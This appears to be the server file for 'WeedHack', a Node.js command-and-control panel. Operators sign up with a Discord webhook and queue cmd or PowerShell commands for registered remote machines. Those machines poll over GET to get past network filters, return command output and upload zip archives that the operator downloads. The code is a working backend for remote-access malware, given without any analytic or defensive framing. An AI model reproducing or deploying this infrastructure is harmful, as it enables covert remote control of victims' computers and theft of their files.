// language: JavaScript, file: server.js, target: Node 22.5+
// weedhack — http on :80. client rpc over GET (middlebox filters POST).
// upload over PUT. node:sqlite.

import 'dotenv/config';
import express from 'express';
import helmet from 'helmet';
import cookieParser from 'cookie-parser';
import rateLimit from 'express-rate-limit';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import crypto from 'node:crypto';
import fs from 'node:fs';
import http from 'node:http';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import db, { UPLOAD_DIR } from './db.js';
import { startTcp, startUdp } from './net.js';

const __dirname  = path.dirname(fileURLToPath(import.meta.url));
const PUBLIC_DIR = path.join(__dirname, 'public');

const CFG = {
  httpPort:   Number(process.env.HTTP_PORT || 80),
  tcpPort:    Number(process.env.TCP_PORT  || 443),
  udpPort:    Number(process.env.UDP_PORT  || 880),
  bindHost:   process.env.BIND_HOST || '0.0.0.0',
  jwtSecret:  process.env.JWT_SECRET || 'dev_only_change_me',
  cookieSecure: process.env.COOKIE_SECURE === 'true',
  maxUpload:  Number(process.env.MAX_UPLOAD_BYTES || 64 * 1024 * 1024),
};

if (!fs.existsSync(path.join(PUBLIC_DIR, 'css', 'style.css'))) {
  console.error(`[startup] FATAL: ${PUBLIC_DIR}/css/style.css missing.`);
  process.exit(1);
}

const app = express();
app.disable('x-powered-by');
app.set('trust proxy', false);

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc:  ["'self'"],
      styleSrc:   ["'self'", "'unsafe-inline'"],
      imgSrc:     ["'self'", 'data:'],
      connectSrc: ["'self'"],
      frameAncestors: ["'none'"],
      objectSrc:  ["'none'"],
      baseUri:    ["'self'"],
      upgradeInsecureRequests: null,
    },
  },
  hsts: false,
  crossOriginResourcePolicy: { policy: 'same-origin' },
  referrerPolicy: { policy: 'no-referrer' },
}));
app.use(cookieParser());

app.use((req, res, next) => {
  const t = Date.now();
  res.on('finish', () => {
    console.log(`[http] ${req.method} ${req.url} ${req.ip} -> ${res.statusCode} (${Date.now() - t}ms)`);
  });
  next();
});

app.use('/api/client/upload', express.raw({
  type: ['application/zip', 'application/octet-stream'],
  limit: CFG.maxUpload,
}));
app.use(express.json({ limit: '128kb' }));

const limit = (opts) => rateLimit({ standardHeaders: true, legacyHeaders: false, ...opts });
const limitGlobal   = limit({ windowMs: 60_000,      max: 120, message: { error: 'too many requests' } });
const limitAuth     = limit({ windowMs: 15 * 60_000, max: 10,  message: { error: 'too many attempts, slow down' } });
const limitWebhook  = limit({ windowMs: 60 * 60_000, max: 5,   message: { error: 'webhook test limit reached' } });
const limitClient   = limit({ windowMs: 60_000,      max: 600, message: { error: 'too many client requests' } });
const limitUpload   = limit({ windowMs: 60 * 60_000, max: 10,  message: { error: 'upload limit reached — max 10 per hour' } });
const limitDownload = limit({ windowMs: 60_000,      max: 30,  message: { error: 'too many downloads' } });
app.use(limitGlobal);

const sql = (strings, ...vals) => {
  if (vals.length) throw new Error('sql tagged template refused — use ? params');
  return strings[0];
};

function genKey() {
  const A = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  const block = () => Array.from({ length: 4 }, () => A[crypto.randomInt(A.length)]).join('');
  return [block(), block(), block(), block()].join('-');
}

const signToken  = (u) => jwt.sign({ uid: u.id, username: u.username }, CFG.jwtSecret, { expiresIn: '7d' });
const cookieOpts = () => ({ httpOnly: true, sameSite: 'lax', secure: CFG.cookieSecure, maxAge: 7 * 24 * 3600 * 1000 });

function requireAuth(req, res, next) {
  const token = req.cookies?.token;
  if (!token) return res.status(401).json({ error: 'unauthorized' });
  try { req.user = jwt.verify(token, CFG.jwtSecret); next(); }
  catch { return res.status(401).json({ error: 'unauthorized' }); }
}

// body from GET (base64url in ?d=) or POST/PUT (json body)
function parseClientBody(req) {
  if (req.method === 'GET') {
    const d = req.query.d;
    if (!d) return {};
    try {
      return JSON.parse(Buffer.from(d, 'base64url').toString('utf8'));
    } catch { return {}; }
  }
  return req.body || {};
}

function requireKeyFlexible(req, res, next) {
  const body = parseClientBody(req);
  req.clientBody = body;
  const key = body.key || req.query.key;
  if (!key) return res.status(401).json({ error: 'missing key' });
  const user = db.prepare(sql`SELECT id, username FROM users WHERE account_key = ?`).get(key);
  if (!user) return res.status(401).json({ error: 'invalid key' });
  req.keyUser = user;
  next();
}

const isDiscordWebhook = (url) => typeof url === 'string' &&
  /^https:\/\/(discord|discordapp)\.com\/api\/webhooks\/\d+\/[\w-]+$/.test(url);

async function sendWebhook(url, payload) {
  try {
    const r = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: 'WeedHack', ...payload }),
      redirect: 'error',
      signal: AbortSignal.timeout(5000),
    });
    return r.ok;
  } catch { return false; }
}

const getOwnUser = (uid) => db.prepare(sql`
  SELECT id, username, email, account_key, discord_webhook, created_at
  FROM users WHERE id = ?
`).get(uid);

app.use(express.static(PUBLIC_DIR, {
  etag: true,
  maxAge: '1h',
  setHeaders: (res, filePath) => {
    if (filePath.endsWith('.html')) res.setHeader('Cache-Control', 'no-store');
  },
}));

app.get('/api/health', (_req, res) => {
  res.json({
    ok: true,
    uptime: Math.round(process.uptime()),
    http: CFG.httpPort,
    tcp: CFG.tcpPort,
    udp: CFG.udpPort,
    time: new Date().toISOString(),
  });
});

app.post('/api/signup', limitAuth, async (req, res) => {
  const { username, email, password, discordWebhook } = req.body || {};
  if (!username || !email || !password || !discordWebhook)
    return res.status(400).json({ error: 'all fields required' });
  if (username.length < 3 || username.length > 32)
    return res.status(400).json({ error: 'username 3-32 chars' });
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email))
    return res.status(400).json({ error: 'invalid email' });
  if (password.length < 8)
    return res.status(400).json({ error: 'password min 8 chars' });
  if (!isDiscordWebhook(discordWebhook))
    return res.status(400).json({ error: 'invalid discord webhook url' });

  const exists = db.prepare(sql`SELECT id FROM users WHERE username = ? OR email = ?`).get(username, email);
  if (exists) return res.status(409).json({ error: 'username or email taken' });

  const webhookOk = await sendWebhook(discordWebhook, {
    content: `webhook verified for \`${username}\``,
    embeds: [{
      title: 'account verified',
      color: 0x2E7D32,
      description: 'your webhook is live. your account key arrives next.',
      timestamp: new Date().toISOString(),
    }],
  });
  if (!webhookOk) return res.status(400).json({ error: 'webhook unreachable — check the url' });

  const hash = await bcrypt.hash(password, 12);
  const accountKey = genKey();

  const info = db.prepare(sql`
    INSERT INTO users (username, email, password_hash, account_key, discord_webhook, created_at)
    VALUES (?, ?, ?, ?, ?, ?)
  `).run(username, email, hash, accountKey, discordWebhook, Date.now());

  const user = { id: Number(info.lastInsertRowid), username };

  sendWebhook(discordWebhook, {
    content: `account key for **${username}**`,
    embeds: [{
      title: 'your account key',
      color: 0x6B0F2B,
      description: `\`\`\`\n${accountKey}\n\`\`\`\nsave this. shown once on screen too.`,
      timestamp: new Date().toISOString(),
    }],
  });

  res.cookie('token', signToken(user), cookieOpts());
  res.json({ ok: true, accountKey, username });
});

app.post('/api/signin', limitAuth, async (req, res) => {
  const { username, password } = req.body || {};
  if (!username || !password) return res.status(400).json({ error: 'missing fields' });
  const user = db.prepare(sql`SELECT * FROM users WHERE username = ? OR email = ?`).get(username, username);
  if (!user) return res.status(401).json({ error: 'invalid credentials' });
  const ok = await bcrypt.compare(password, user.password_hash);
  if (!ok) return res.status(401).json({ error: 'invalid credentials' });
  res.cookie('token', signToken({ id: user.id, username: user.username }), cookieOpts());
  res.json({ ok: true, username: user.username });
});

app.post('/api/logout', (_req, res) => { res.clearCookie('token'); res.json({ ok: true }); });

app.get('/api/me', requireAuth, (req, res) => {
  const row = getOwnUser(req.user.uid);
  if (!row) return res.status(404).json({ error: 'not found' });
  res.json({
    username: row.username,
    email: row.email,
    accountKey: row.account_key,
    discordWebhook: row.discord_webhook,
    createdAt: row.created_at,
  });
});

app.post('/api/webhook/test', requireAuth, limitWebhook, async (req, res) => {
  const { url } = req.body || {};
  if (!isDiscordWebhook(url)) return res.status(400).json({ error: 'invalid discord webhook url' });
  const ok = await sendWebhook(url, {
    content: 'webhook test',
    embeds: [{ title: 'connection live', color: 0x2E7D32, timestamp: new Date().toISOString() }],
  });
  if (!ok) return res.status(502).json({ error: 'webhook unreachable' });
  db.prepare(sql`UPDATE users SET discord_webhook = ? WHERE id = ?`).run(url, req.user.uid);
  res.json({ ok: true });
});

// ---------- client RPC (accepts GET and POST) ----------

app.all('/api/client/register', limitClient, requireKeyFlexible, (req, res) => {
  const body = req.clientBody;
  const hostname = String(body.hostname || 'unknown').slice(0, 64);
  const ip = req.ip || '';
  const uid = req.keyUser.id;

  const existing = db.prepare(sql`SELECT id FROM clients WHERE user_id = ? AND hostname = ?`).get(uid, hostname);
  if (existing) {
    db.prepare(sql`UPDATE clients SET ip = ?, last_seen = ? WHERE id = ?`).run(ip, Date.now(), existing.id);
    return res.json({ ok: true, clientId: Number(existing.id) });
  }

  const info = db.prepare(sql`
    INSERT INTO clients (user_id, key, hostname, ip, last_seen)
    VALUES (?, ?, ?, ?, ?)
  `).run(uid, body.key, hostname, ip, Date.now());

  res.json({ ok: true, clientId: Number(info.lastInsertRowid) });
});

app.all('/api/client/pull', limitClient, requireKeyFlexible, (req, res) => {
  const uid = req.keyUser.id;
  const ip = req.ip || '';
  const clientId = Number(req.clientBody.clientId || 0);

  let client = null;
  if (clientId) {
    client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, uid);
  }
  if (!client) {
    client = db.prepare(sql`
      SELECT id FROM clients WHERE user_id = ? AND ip = ?
      ORDER BY last_seen DESC LIMIT 1
    `).get(uid, ip);
  }
  if (client) {
    db.prepare(sql`UPDATE clients SET last_seen = ?, ip = ? WHERE id = ?`).run(Date.now(), ip, client.id);
  }

  const cmd = db.prepare(sql`
    SELECT id, shell, line FROM commands
    WHERE user_id = ? AND status = 'pending'
    ORDER BY created_at ASC LIMIT 1
  `).get(uid);

  if (!cmd) return res.json({ id: null, clientId: client ? Number(client.id) : null });

  db.prepare(sql`UPDATE commands SET status = 'sent' WHERE id = ?`).run(cmd.id);
  res.json({
    id: Number(cmd.id),
    shell: cmd.shell,
    line: cmd.line,
    clientId: client ? Number(client.id) : null,
  });
});

app.all('/api/client/result', limitClient, requireKeyFlexible, (req, res) => {
  const body = req.clientBody;
  const { id, output } = body;
  if (!id) return res.status(400).json({ error: 'missing id' });

  const info = db.prepare(sql`
    UPDATE commands SET output = ?, status = 'done'
    WHERE id = ? AND user_id = ?
  `).run(String(output || '').slice(0, 65536), id, req.keyUser.id);

  if (info.changes === 0) return res.status(404).json({ error: 'command not found' });
  res.json({ ok: true });
});

// upload accepts POST or PUT
app.all('/api/client/upload', limitUpload, requireKeyFlexible, (req, res) => {
  const uid = req.keyUser.id;
  const ip = req.ip || '';
  const clientId = Number(req.query.clientId || 0);
  const filename = String(req.query.name || 'upload.zip').slice(0, 128).replace(/[^\w.\-]/g, '_');

  if (!Buffer.isBuffer(req.body) || req.body.length === 0)
    return res.status(400).json({ error: 'empty body' });
  if (req.body.length > CFG.maxUpload)
    return res.status(413).json({ error: 'file too large' });
  if (!(req.body[0] === 0x50 && req.body[1] === 0x4B))
    return res.status(400).json({ error: 'not a zip file' });

  let client = null;
  if (clientId) {
    client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, uid);
  }
  if (!client) {
    client = db.prepare(sql`
      SELECT id FROM clients WHERE user_id = ? AND ip = ?
      ORDER BY last_seen DESC LIMIT 1
    `).get(uid, ip);
  }
  if (!client) return res.status(400).json({ error: 'client not registered' });

  const storedName = `${crypto.randomUUID()}.zip`;
  const dest = path.join(UPLOAD_DIR, storedName);
  try { fs.writeFileSync(dest, req.body, { mode: 0o600 }); }
  catch { return res.status(500).json({ error: 'write failed' }); }

  const info = db.prepare(sql`
    INSERT INTO uploads (user_id, client_id, filename, stored_name, size, created_at)
    VALUES (?, ?, ?, ?, ?, ?)
  `).run(uid, client.id, filename, storedName, req.body.length, Date.now());

  res.json({ ok: true, uploadId: Number(info.lastInsertRowid), filename, size: req.body.length });
});

// ---------- dashboard ----------
app.get('/api/clients', requireAuth, (req, res) => {
  const rows = db.prepare(sql`
    SELECT id, hostname, ip, last_seen FROM clients
    WHERE user_id = ? ORDER BY last_seen DESC
  `).all(req.user.uid);
  const now = Date.now();
  res.json(rows.map(r => ({
    id: r.id, hostname: r.hostname, ip: r.ip,
    online: now - r.last_seen < 30_000,
    lastSeen: r.last_seen,
  })));
});

app.get('/api/clients/:id/uploads', requireAuth, (req, res) => {
  const clientId = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });
  const rows = db.prepare(sql`
    SELECT id, filename, size, created_at FROM uploads
    WHERE user_id = ? AND client_id = ?
    ORDER BY created_at DESC LIMIT 200
  `).all(req.user.uid, clientId);
  res.json(rows);
});

app.get('/api/uploads/:id/download', limitDownload, requireAuth, (req, res) => {
  const uploadId = Number(req.params.id);
  const row = db.prepare(sql`
    SELECT filename, stored_name, size FROM uploads
    WHERE id = ? AND user_id = ?
  `).get(uploadId, req.user.uid);
  if (!row) return res.status(404).json({ error: 'not found' });
  const src = path.join(UPLOAD_DIR, row.stored_name);
  if (!fs.existsSync(src)) return res.status(410).json({ error: 'file gone' });
  res.setHeader('Content-Type', 'application/zip');
  res.setHeader('Content-Length', row.size);
  res.setHeader('Content-Disposition', `attachment; filename="${row.filename.replace(/"/g, '')}"`);
  fs.createReadStream(src).pipe(res);
});

app.post('/api/clients/:id/exec', requireAuth, (req, res) => {
  const clientId = Number(req.params.id);
  const { shell, line } = req.body || {};
  if (!['cmd', 'powershell'].includes(shell)) return res.status(400).json({ error: 'bad shell' });
  if (typeof line !== 'string' || !line.trim() || line.length > 4096)
    return res.status(400).json({ error: 'bad line' });

  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });

  const info = db.prepare(sql`
    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
    VALUES (?, ?, ?, ?, 'pending', ?)
  `).run(req.user.uid, clientId, shell, line, Date.now());

  res.json({ ok: true, commandId: Number(info.lastInsertRowid) });
});

app.get('/api/clients/:id/commands', requireAuth, (req, res) => {
  const clientId = Number(req.params.id);
  const rows = db.prepare(sql`
    SELECT id, shell, line, output, status, created_at FROM commands
    WHERE user_id = ? AND client_id = ?
    ORDER BY created_at DESC LIMIT 100
  `).all(req.user.uid, clientId);
  res.json(rows);
});

app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));

app.use((err, _req, res, _next) => {
  console.error('[http] unhandled:', err);
  res.status(500).json({ error: 'server error' });
});

// ---------- listeners ----------
let udpBound = false;

const tcpServer = startTcp({
  host: CFG.bindHost,
  port: CFG.tcpPort,
  onConn: (sock) => { sock.write('weedhack tcp ready\n'); },
  onLine: (line, sock) => {
    if (line === 'ping') sock.write('pong\n');
    else if (line === 'who') sock.write(`you ${sock.remoteAddress}:${sock.remotePort}\n`);
    else sock.write(`echo: ${line}\n`);
  },
});

const udpSock = startUdp({
  host: CFG.bindHost,
  port: CFG.udpPort,
  onMsg: (text, rinfo, s) => {
    const reply = Buffer.from(`weedhack: ${text}`);
    s.send(reply, rinfo.port, rinfo.address, () => {});
  },
});
udpSock.on('listening', () => { udpBound = true; });

const httpServer = http.createServer(app);
httpServer.listen(CFG.httpPort, CFG.bindHost, () => {
  console.log(`[startup] cwd     = ${process.cwd()}`);
  console.log(`[startup] public  = ${PUBLIC_DIR}`);
  console.log('');
  console.log(`WeedHack http up on ${CFG.bindHost}:${CFG.httpPort}`);
  console.log(`WeedHack tcp  on ${CFG.bindHost}:${CFG.tcpPort}`);
  console.log(`WeedHack udp  on ${CFG.bindHost}:${CFG.udpPort}`);
});

let shuttingDown = false;
function shutdown(sig) {
  if (shuttingDown) return;
  shuttingDown = true;
  console.log(`\n[shutdown] ${sig}`);
  httpServer.close(() => console.log('[shutdown] http closed'));
  if (tcpServer.shutdown) tcpServer.shutdown();
  try { udpSock.close(() => console.log('[shutdown] udp closed')); } catch {}
  setTimeout(() => process.exit(0), 3000).unref();
}

process.on('SIGINT',  () => shutdown('SIGINT'));
process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('uncaughtException',  (e) => console.error('[uncaught]', e));
process.on('unhandledRejection', (e) => console.error('[unhandled]', e));